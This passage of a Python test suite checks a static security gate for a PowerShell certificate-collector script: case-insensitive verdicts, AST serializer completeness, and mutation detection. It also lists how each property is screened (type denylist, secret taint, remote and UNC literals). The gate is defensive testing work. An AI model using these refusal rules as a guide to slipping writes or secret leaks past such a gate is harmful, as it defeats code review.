            "$certDir",
            "$certDir",
            "$outPath",
            "(Join-Path $certDir $certFile)",
            "(Join-Path $certDir $crlFile)",
        ]
    )
    assert _write_guard_violations(dump) == []
    # The guard function is defined exactly once and is a local function.
    assert [f["name"] for f in dump["functions"]].count(WRITE_GUARD) == 1


# --- case-insensitivity meta-test (DeepSeek B-R3-1) --------------------------------
# PowerShell command/function/parameter/variable names are case-insensitive, so
# every APPEND-style regression snippet (the bad snippets, the Sol round-2 set and
# the append-only R3 probes -- not the replacement / multi-edit probes) must get
# the SAME verdict when the casing of its
# NAMES is flipped. The dumper's -SwapNames mode flips the case of command /
# function-call names, parameter flags and variable names only (bareword values,
# quoted strings, type literals and member names are left intact), so this tests
# names without disturbing the values the gate pins exactly.


def _append_snippets() -> dict[str, str]:
    out = {f"bad::{k}": v for k, v in _BAD_SNIPPETS.items()}
    out.update({f"sol::{k}": v for k, (v, _tag) in _SOL_R2.items()})
    for probe_id, edits, _expected in _R3_PROBES:
        if len(edits) == 1 and edits[0][0] == "":
            out[f"r3::{probe_id}"] = edits[0][1]
    return out


@cache
def _name_swapped_scripts() -> dict[str, str]:
    """key -> `_appended(<snippet with NAME casing flipped>)` (the snippet alone
    is name-swapped via pwsh, then appended to the unchanged collector, so only
    the probe's casing varies)."""
    items = sorted(_append_snippets().items())
    with tempfile.TemporaryDirectory(prefix="adcs-swap-") as tmp:
        paths = []
        for key, snippet in items:
            path = Path(tmp) / f"{_key(key.encode())[:16]}.ps1"
            path.write_text(snippet + "\n", encoding="utf-8")
            paths.append(path)
        swapped = {Path(e["path"]).name: e["swapped"] for e in _run_dumper(paths, "-SwapNames")}
    out = {}
    for (key, _), path in zip(items, paths, strict=True):
        out[key] = _appended(swapped[path.name].rstrip("\n"))
    register_sources(out.values())
    return out


@pytest.mark.parametrize("key", sorted(_append_snippets()))
def test_verdict_is_case_insensitive(tmp_path: Path, key: str) -> None:
    snippet = _append_snippets()[key]
    canonical = _tags(violations(_check_text(tmp_path, _appended(snippet))))
    swapped_src = _name_swapped_scripts()[key]
    swapped = _tags(violations(_check_text(tmp_path, swapped_src)))
    assert canonical == swapped, (key, sorted(canonical), sorted(swapped))


# Edits the semantic floor deliberately admits (no write/exec/binding effect)
# but the golden inventory must still catch, so a reviewer sees them.
# A comment-only edit changes the source digest but not the AST or any statement,
# so the semantic floor admits it and only the golden source digest catches it.
_GOLDEN_ONLY: list[tuple[str, tuple[Edit, ...]]] = [
    ("comment_only", (("", "# reviewer note"),)),
]


@pytest.mark.parametrize("probe", _GOLDEN_ONLY, ids=[p[0] for p in _GOLDEN_ONLY])
def test_golden_catches_semantically_neutral_edits(
    tmp_path: Path, probe: tuple[str, tuple[Edit, ...]]
) -> None:
    probe_id, edits = probe
    dump = _check_text(tmp_path, _apply(edits))
    assert violations(dump) == [], probe_id
    assert render_inventory(dump) != INVENTORY.read_text(encoding="utf-8"), probe_id
    assert tree_changed(dump) == (probe_id != "comment_only"), probe_id


# Register every variant above so they are dumped in a few batched pwsh runs
# (a fixture, so importing this module — e.g. from regen_inventory.py — dumps
# nothing extra).
@pytest.fixture(autouse=True, scope="module")
def _batch_variants() -> None:
    register_sources(_all_variants())


def _all_variants() -> list[str]:
    return [
        *(_appended(s) for s in _BAD_SNIPPETS.values()),
        *(_replaced(n) for n in _REPLACEMENTS),
        _appended("Write-Output 'done'"),
        *(_appended(s) for s, _ in _SOL_R2.values()),
        _appended("$NULL = 'C:\\Windows\\Temp\\err.txt'"),
        _appended("certutil -getreg CA\\CommonName 2>$null"),
        *(_apply(e) for _, e, _ in _R3_PROBES),
        *(_apply(e) for _, e in _GOLDEN_ONLY),
    ]


# --- completeness of the syntax-tree serialization (meta-tests) --------------------

# Properties the serializer deliberately skips on every node type, and why.
_EXCLUDED_AST_PROPERTIES = {
    "*.Parent": "back-reference; structure is the row nesting",
    "*.Extent": "source position/text; the text is represented by the child nodes",
    "*.ErrorPosition": "source position of an operator token",
    "*.StaticType": "derived by the parser from the node type, constant or cast",
    "ConvertExpressionAst.Attribute": "the same object as ConvertExpressionAst.Type",
}
_KNOWN_REQUIREMENT_PROPERTIES = {
    "IsElevationRequired",
    "RequiredApplicationId",
    "RequiredAssemblies",
    "RequiredModules",
    "RequiredPSEditions",
    "RequiredPSVersion",
    "RequiresPSSnapIns",  # Windows PowerShell 5.1 only
}


_SEMANTIC_PROPERTY_DISPOSITION: dict[str, str] = {
    "ArrayExpressionAst.SubExpression": "structural: its child nodes are each serialized and checked",
    "ArrayLiteralAst.Elements": "structural: its child nodes are each serialized and checked",
    "AssignmentStatementAst.Left": "check: assignment target (bindings / member_assignments)",
    "AssignmentStatementAst.Operator": "check: binding kind (_bindings_by_var / check_bindings)",
    "AssignmentStatementAst.Right": "check: binding value (dataflow pins, secret taint, UNC literals)",
    "AttributeAst.NamedArguments": "structural: its child nodes are each serialized and checked",
    "AttributeAst.PositionalArguments": "structural: its child nodes are each serialized and checked",
    "AttributeAst.TypeName": "check: type denylist (static_types / _NEVER_TYPES)",
    "BinaryExpressionAst.Left": "structural: its child nodes are each serialized and checked",
    "BinaryExpressionAst.Operator": "inert: arithmetic/logical/comparison operator, no I/O",
    "BinaryExpressionAst.Right": "structural: its child nodes are each serialized and checked",
    "BreakStatementAst.Label": "inert: loop label, control flow only",
    "CatchClauseAst.Body": "structural: its child nodes are each serialized and checked",
    "CatchClauseAst.CatchTypes": "check: type denylist (static_types)",
    "CatchClauseAst.IsCatchAll": "inert: catch-all flag, control flow only",
    "CommandAst.CommandElements": "check: commands projection (name, every argument, metadata)",
    "CommandAst.DefiningKeyword": "inert: null for ordinary commands; a defining keyword yields a refused node type",
    "CommandAst.InvocationOperator": "check: violations() (Dot dot-sourcing refused, Ampersand dynamic pinned)",
    "CommandAst.Redirections": "check: redirections projection",
    "CommandExpressionAst.Expression": "structural: its child nodes are each serialized and checked",
    "CommandExpressionAst.Redirections": "check: redirections projection",
    "CommandParameterAst.Argument": "structural: its child nodes are each serialized and checked",
    "CommandParameterAst.ParameterName": "check: commands elements (parameter names, common-parameter / metadata)",
    "ConstantExpressionAst.Value": "inert: a numeric / non-string constant, no I/O (strings are StringConstantExpressionAst)",
    "ContinueStatementAst.Label": "inert: loop label, control flow only",
    "ConvertExpressionAst.Child": "structural: its child nodes are each serialized and checked",
    "ConvertExpressionAst.Type": "check: type denylist (static_types) and [ref] binding",
    "ExpandableStringExpressionAst.NestedExpressions": "structural: its child nodes are each serialized and checked",
    "ExpandableStringExpressionAst.StringConstantType": "inert: quoting kind",
    "ExpandableStringExpressionAst.Value": "check: string_literals (REMOTE_LITERALS)",
    "ForEachStatementAst.Body": "structural: its child nodes are each serialized and checked",
    "ForEachStatementAst.Condition": "check: conditions projection + string_literals",
    "ForEachStatementAst.Flags": "check: statement_flags (foreach -Parallel refused)",
    "ForEachStatementAst.Label": "inert: loop label, control flow only",
    "ForEachStatementAst.ThrottleLimit": "inert: only meaningful with -Parallel, which statement_flags refuses",
    "ForEachStatementAst.Variable": "check: bindings (foreach loop variable)",
    "ForStatementAst.Body": "structural: its child nodes are each serialized and checked",
    "ForStatementAst.Condition": "check: conditions projection + string_literals",
    "ForStatementAst.Initializer": "structural: its child nodes are each serialized and checked",
    "ForStatementAst.Iterator": "structural: its child nodes are each serialized and checked",
    "ForStatementAst.Label": "inert: loop label, control flow only",
    "FunctionDefinitionAst.Body": "structural: its child nodes are each serialized and checked",
    "FunctionDefinitionAst.IsFilter": "check: STATEMENT_DIGESTS (the function statement digest covers the whole body)",
    "FunctionDefinitionAst.IsWorkflow": "check: STATEMENT_DIGESTS (a workflow changes the function statement subtree)",
    "FunctionDefinitionAst.Name": "check: LOCAL_FUNCTIONS (exact ordered set)",
    "FunctionDefinitionAst.Parameters": "check: bindings (parameter declarations)",
    "HashtableAst.KeyValuePairs": "structural: its child nodes are each serialized and checked",
    "IfStatementAst.Clauses": "check: conditions projection (+ bodies structural)",
    "IfStatementAst.ElseClause": "structural: its child nodes are each serialized and checked",
    "IndexExpressionAst.Index": "structural: its child nodes are each serialized and checked",
    "IndexExpressionAst.NullConditional": "inert: ?[] null-conditional flag, no I/O",
    "IndexExpressionAst.Target": "check: member_assignments root (index writes) + structural",
    "InvokeMemberExpressionAst.Arguments": "check: PINNED_MEMBER_CALLS + argument variables, UNC, secret",
    "InvokeMemberExpressionAst.Expression": "check: receiver (INSTANCE_RECEIVERS / receiver pins)",
    "InvokeMemberExpressionAst.GenericTypeArguments": "check: type denylist (static_types)",
    "InvokeMemberExpressionAst.Member": "check: member allowlist (ALLOWED_INSTANCE / ALLOWED_STATIC)",
    "InvokeMemberExpressionAst.NullConditional": "inert: ?. null-conditional flag, no I/O",
    "InvokeMemberExpressionAst.Static": "check: members projection (static vs instance)",
    "MemberExpressionAst.Expression": "check: receiver (member_assignments root)",
    "MemberExpressionAst.Member": "check: member name (member_assignments allowlist)",
    "MemberExpressionAst.NullConditional": "inert: ?. null-conditional flag, no I/O",
    "MemberExpressionAst.Static": "check: members / member_assignments projection",
    "MergingRedirectionAst.FromStream": "check: redirections (ALLOWED_REDIRECTIONS)",
    "MergingRedirectionAst.ToStream": "check: redirections (ALLOWED_REDIRECTIONS)",
    "NamedAttributeArgumentAst.Argument": "structural: its child nodes are each serialized and checked",
    "NamedAttributeArgumentAst.ArgumentName": "check: function_params pipeline check (ValueFromPipeline*)",
    "NamedAttributeArgumentAst.ExpressionOmitted": "inert: switch-style attribute arg, no I/O",
    "NamedBlockAst.BlockKind": "check: STATEMENT_DIGESTS ancestor chain (begin/process/end/clean lifecycle)",
    "NamedBlockAst.Statements": "structural: its child nodes are each serialized and checked",
    "NamedBlockAst.Traps": "check: node_types (a trap yields a refused TrapStatementAst)",
    "NamedBlockAst.Unnamed": "check: STATEMENT_DIGESTS ancestor chain (implicit vs explicit block)",
    "ParamBlockAst.Attributes": "check: type denylist (static_types) + structural",
    "ParamBlockAst.Parameters": "structural: its child nodes are each serialized and checked",
    "ParameterAst.Attributes": "check: type denylist (static_types)",
    "ParameterAst.DefaultValue": "structural: its child nodes are each serialized and checked",
    "ParameterAst.Name": "check: bindings (parameter declaration)",
    "ParenExpressionAst.Pipeline": "structural: its child nodes are each serialized and checked",
    "PipelineAst.Background": "check: background_pipelines (background jobs refused)",
    "PipelineAst.PipelineElements": "structural: its child nodes are each serialized and checked",
    "ReturnStatementAst.Pipeline": "structural: its child nodes are each serialized and checked",
    "ScriptBlockAst.Attributes": "check: type denylist (static_types)",
    "ScriptBlockAst.BeginBlock": "structural: its child nodes are each serialized and checked",
    "ScriptBlockAst.CleanBlock": "structural: its child nodes are each serialized and checked",
    "ScriptBlockAst.DynamicParamBlock": "inert: dynamicparam block; the collector defines none (would change the body digest + golden)",
    "ScriptBlockAst.EndBlock": "structural: its child nodes are each serialized and checked",
    "ScriptBlockAst.ParamBlock": "structural: its child nodes are each serialized and checked",
    "ScriptBlockAst.ProcessBlock": "structural: its child nodes are each serialized and checked",
    "ScriptBlockAst.ScriptRequirements": "check: script_requirements (#Requires refused)",
    "ScriptBlockAst.UsingStatements": "check: node_types (using statements yield refused UsingStatementAst)",
    "ScriptBlockExpressionAst.ScriptBlock": "check: _scope (caller-scope collapse) + structural",
    "StatementBlockAst.Statements": "structural: its child nodes are each serialized and checked",
    "StatementBlockAst.Traps": "check: node_types (a trap yields a refused TrapStatementAst)",
    "StringConstantExpressionAst.StringConstantType": "inert: bareword vs quoted kind (a bareword command name is checked via commands)",
    "StringConstantExpressionAst.Value": "check: string_literals (REMOTE_LITERALS) + command/argument checks",
    "SubExpressionAst.SubExpression": "structural: its child nodes are each serialized and checked",
    "SwitchStatementAst.Clauses": "structural: its child nodes are each serialized and checked",
    "SwitchStatementAst.Condition": "check: conditions projection + string_literals (switch input)",
    "SwitchStatementAst.Default": "structural: its child nodes are each serialized and checked",
    "SwitchStatementAst.Flags": "check: statement_flags (switch -File / -Regex refused)",
    "SwitchStatementAst.Label": "inert: loop label, control flow only",
    "ThrowStatementAst.IsRethrow": "inert: rethrow flag, control flow only",
    "ThrowStatementAst.Pipeline": "structural: its child nodes are each serialized and checked",
    "TryStatementAst.Body": "structural: its child nodes are each serialized and checked",
    "TryStatementAst.CatchClauses": "structural: its child nodes are each serialized and checked",
    "TryStatementAst.Finally": "structural: its child nodes are each serialized and checked",
    "TypeConstraintAst.TypeName": "check: type denylist (static_types / _NEVER_TYPES)",
    "TypeExpressionAst.TypeName": "check: type denylist (static_types / ALLOWED_STATIC / _NEVER_TYPES)",
    "UnaryExpressionAst.Child": "structural: its child nodes are each serialized and checked",
    "UnaryExpressionAst.TokenKind": "check: bindings (++/-- rebind their operand)",
    "VariableExpressionAst.Splatted": "check: splatting refused (check_bindings / variable_refs)",
    "VariableExpressionAst.VariablePath": "check: variable_refs (provider-drive refused) + bindings + secret taint",
}


def test_every_serialized_property_is_inspected_or_declared_inert() -> None:
    """Semantic-projection completeness: for every (AST node type, property) the
    golden serializer emits, the semantic layer must either INSPECT it or declare
    it SEMANTICALLY INERT with a reason. A serialized property of an ALLOWED node
    type that is in neither place fails here, so a new I/O- or behaviour-capable
    property cannot be serialized (and pass the golden) while the floor ignores
    it. Properties of a refused node type are inert because the node type itself
    is rejected by ALLOWED_NODE_TYPES."""
    table = _run_dumper([], "-Describe", timeout=120)["table"]
    missing: list[str] = []
    for node_type, props in table.items():
        if node_type not in ALLOWED_NODE_TYPES:
            continue  # the whole node type is refused (test_whole_tree_screens)
        for prop in props:
            key = f"{node_type}.{prop}"
            if key not in _SEMANTIC_PROPERTY_DISPOSITION:
                missing.append(key)
    assert not missing, (
        "serialized properties with no semantic disposition (inspect them or add a "
        "SEMANTICALLY_INERT reason to _SEMANTIC_PROPERTY_DISPOSITION):\n"
        + "\n".join(sorted(missing))
    )
    serialized = {
        f"{t}.{p}" for t, props in table.items() if t in ALLOWED_NODE_TYPES for p in props
    }
    stale = sorted(set(_SEMANTIC_PROPERTY_DISPOSITION) - serialized)
    assert not stale, "dispositions for properties the serializer no longer emits:\n" + "\n".join(
        stale
    )


def test_switch_and_loop_flags_are_refused() -> None:
    """Every switch / foreach statement in the collector has Flags=None, and a
    switch -File is rejected (its input is also screened as a remote literal)."""
    dump = _dump(COLLECTOR)
    assert all(sf["flags"] == "None" for sf in dump["statement_flags"])


def test_serializer_covers_every_ast_node_type() -> None:
    """Every concrete Ast type of the running PowerShell is in the serializer
    table, and every public property is serialized or excluded with a stated
    reason. A new PowerShell node type or property fails here."""
    described = _run_dumper([], "-Describe", timeout=120)
    table = described["table"]
    assert set(described["excluded"]) == set(_EXCLUDED_AST_PROPERTIES)
    problems: list[str] = []
    for node in described["ast_types"]:
        name = node["name"]
        if name not in table:
            problems.append(f"{name}: not in the serializer table")
            continue
        listed = set(table[name])
        for prop in node["properties"]:
            if prop in listed or f"*.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            if f"{name}.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            problems.append(f"{name}.{prop}: neither serialized nor excluded")
    assert not problems, "serializer table is incomplete:\n" + "\n".join(problems)
    unknown = set(described["script_requirements_properties"]) - _KNOWN_REQUIREMENT_PROPERTIES
    assert not unknown, f"new #Requires properties: {sorted(unknown)}"


# One construct per node type the collector does not use, so the serializer is
# exercised on all of them and the closed node set refuses them. Parsed only.
_EXOTIC_SOURCE = """#Requires -Version 5.1
using namespace System.Text
class GateBox : System.Object {
    [string] $Name = 'x'
    hidden static [int] $Count
    GateBox() { $this.Name = 'y' }
    [string] Show([int] $n) { return $this.Name * $n }
}
enum GateColor { Red = 1; Blue }
function Get-Gate { [CmdletBinding()] param([Parameter(Mandatory)][ValidateNotNull()] $a)
    dynamicparam { }
    begin { trap { continue } }
    process { do { $a-- } until ($a -lt 0); do { break } while ($false); for ($k = 0; $k -lt 1; $k++) { } }
    end { data GateData { 'x' }; $b = $a ? 1 : 2; Get-Item . && Get-Item .. || Get-Item / }
}
filter Test-Gate { $_ }
$x = [GateBox]::new(); $x.Show(2) | Out-Null
$s = { param($q) $using:q }
Start-Sleep 1 &
foreach -parallel ($i in 1..2) { $i }
while ($false) { }
switch -regex ('a') { 'a' { 1 } default { 2 } }
$h = @{ k = 1 }; $h['k'] += 2; [int]$h.k
"text $($h.k)" | Out-Null; @'
here
'@ | Out-Null
"""


def test_serializer_handles_every_node_type(tmp_path: Path) -> None:
    source = tmp_path / "exotic.ps1"
    source.write_bytes(_EXOTIC_SOURCE.encode("ascii"))
    entry = _run_dumper([source], "-Many", timeout=120)[0]
    assert entry["unsupported_nodes"] == [], entry["unsupported_nodes"]
    lines = inventory(entry)["ast"]
    assert lines[0].startswith("Script: ScriptBlockAst ScriptRequirements=")
    used = set(entry["node_types"])
    for kind in (
        "TypeDefinitionAst",
        "PropertyMemberAst",
        "FunctionMemberAst",
        "TrapStatementAst",
        "DataStatementAst",
        "TernaryExpressionAst",
        "PipelineChainAst",
        "UsingExpressionAst",
        "DoUntilStatementAst",
        "DoWhileStatementAst",
        "ForStatementAst",
        "WhileStatementAst",
        "UsingStatementAst",
    ):
        assert kind in used, f"exotic source did not produce {kind}"
    # All of them are refused by the semantic floor.
    tags = _tags(_structure_violations(entry))
    assert "[ast]" in tags
    assert {
        "TypeDefinitionAst",
        "PipelineChainAst",
        "TrapStatementAst",
    } <= used - ALLOWED_NODE_TYPES


# Single-token mutations by token kind / operator text.
_OPERATOR_SWAPS = {
    "-eq": "-ne",
    "-ne": "-eq",
    "-or": "-and",
    "-and": "-or",
    "-band": "-bor",
    "-bor": "-band",
    "-gt": "-ge",
    "-ge": "-gt",
    "-lt": "-le",
    "-le": "-lt",
    "-match": "-notmatch",
    "-notmatch": "-match",
    "-like": "-notlike",
    "-notlike": "-like",
    "-contains": "-notcontains",
    "-notcontains": "-contains",
    "-in": "-notin",
    "-notin": "-in",
    "-is": "-isnot",
    "-isnot": "-is",
    "-not": "-bnot",
    "-replace": "-creplace",
    "-split": "-csplit",
    "-join": "-split",
    "-f": "-join",
    "+": "-",
    "-": "+",
    "*": "/",
    "/": "*",
    "=": "+=",
    "+=": "=",
    "++": "--",
    "--": "++",
    "2>": "3>",
    "break": "continue",
    "continue": "break",
}


def _token_mutation(token: dict[str, Any]) -> str | None:
    kind, text = token["kind"], token["text"]
    if kind in ("Variable", "SplattedVariable"):
        return text[:-1] + "Q}" if text.endswith("}") else text + "Q"
    if kind == "Parameter":
        return text[:-1] + "Q:" if text.endswith(":") else text + "Q"
    if kind == "Number":
        return "8" if text == "7" else "7"
    if kind in ("StringLiteral", "StringExpandable"):
        return text[0] + "Q" + text[1:]
    if kind in ("HereStringLiteral", "HereStringExpandable"):
        cut = text.index("\n") + 1
        return text[:cut] + "Q" + text[cut:]
    if kind in ("Identifier", "Generic"):
        return text + "Q"
    return _OPERATOR_SWAPS.get(text.lower())


def _evenly(items: list[Any], count: int) -> list[Any]:
    if len(items) <= count:
        return list(items)
    step = (len(items) - 1) / (count - 1)
    return [items[round(i * step)] for i in range(count)]


def _mutants(source: str, sites: dict[str, Any]) -> list[tuple[str, str]]:
    """(label, mutated source) pairs that must each change the syntax tree."""
    out: list[tuple[str, str]] = []
    tokens = [t for t in sites["tokens"] if _token_mutation(t) is not None]
    for t in _evenly(tokens, 40):
        new = _token_mutation(t)
        assert new is not None
        out.append(
            (
                f"token {t['kind']} {t['text']!r}@{t['start']}",
                source[: t["start"]] + new + source[t["end"] :],
            )
        )
    swaps = [
        (s1, e1, s2, e2)
        for s1, e1, s2, e2 in sites["siblings"]
        if " ".join(source[s1:e1].split()) != " ".join(source[s2:e2].split())
    ]
    for s1, e1, s2, e2 in _evenly(swaps, 15):
        swapped = source[:s1] + source[s2:e2] + source[e1:s2] + source[s1:e1] + source[e2:]
        out.append((f"swap statements @{s1}/{s2}", swapped))
    for start, end in _evenly(list(sites["conditions"]), 12):
        out.append(
            (
                f"negate condition @{start}",
                source[:start] + "-not (" + source[start:end] + ")" + source[end:],
            )
        )
    for pos in [*_evenly(list(sites["block_starts"]), 3), len(source)]:
        for label, stmt in (
            ("index assignment", "$PSDefaultParameterValues['Get-Item:Force'] = $true\n"),
            ("return", "return\n"),
        ):
            sep = "" if pos == 0 or source[pos - 1] in "\n " else "\n"
            out.append((f"insert {label} @{pos}", source[:pos] + sep + stmt + source[pos:]))
    out.append(("#Requires module", "#Requires -Modules AdcsLensProbe\n" + source))
    out.append(("#Requires elevation", "#Requires -RunAsAdministrator\n" + source))
    return out


def test_inventory_detects_systematic_mutations(tmp_path: Path) -> None:
    """Generic completeness evidence: mutate the collector systematically —
    single tokens (evenly sampled over every mutable token), adjacent statement
    swaps, negated conditions, an inserted index assignment / `return`, an
    added `#Requires` — and require the serialized tree to differ for every
    mutant that still parses. Comment/whitespace-only edits must leave the tree
    unchanged but change the source digest; CRLF must change nothing."""
    # The committed file has CRLF line endings; mutate an LF copy (the
    # serializer normalizes CRLF, which the "crlf" neutral case checks).
    source = COLLECTOR.read_bytes().decode("ascii").replace("\r\n", "\n")
    base = tmp_path / "base.ps1"
    base.write_bytes(source.encode("ascii"))
    sites = _run_dumper([base], "-Many", "-Sites", timeout=120)[0]
    mutants = _mutants(source, sites)
    files: list[Path] = [base, COLLECTOR]
    for i, (_label, text) in enumerate(mutants):
        target = tmp_path / f"m{i:04d}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    neutral = {
        "comment": "# reviewer comment\n" + source,
        "whitespace": "\n\n" + source.replace("\n", "  \n", 1),
        "crlf": source.replace("\n", "\r\n"),
    }
    for name, text in neutral.items():
        target = tmp_path / f"neutral-{name}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    results = _run_dumper(files, "-Many", "-AstOnly")
    original = inventory(results[0])
    assert inventory(results[1]) == original, "the committed CRLF file and its LF copy differ"
    by_path = {Path(r["path"]).name: inventory(r) for r in results[2:]}
    undetected: list[str] = []
    clean = 0
    for i, (label, _text) in enumerate(mutants):
        mutant = by_path[f"m{i:04d}.ps1"]
        if mutant["parse_errors"]:
            continue
        clean += 1
        if mutant["ast"] == original["ast"]:
            undetected.append(label)
    assert not undetected, f"mutations not reflected in the syntax tree: {undetected}"
    assert clean >= len(mutants) * 0.6, f"only {clean}/{len(mutants)} mutants parsed"
    for name in ("comment", "whitespace"):
        changed = by_path[f"neutral-{name}.ps1"]
        assert changed["ast"] == original["ast"], f"{name}-only edit changed the tree"
        assert changed["source_sha256"] != original["source_sha256"], name
    assert by_path["neutral-crlf.ps1"] == original, "CRLF changed the inventory"
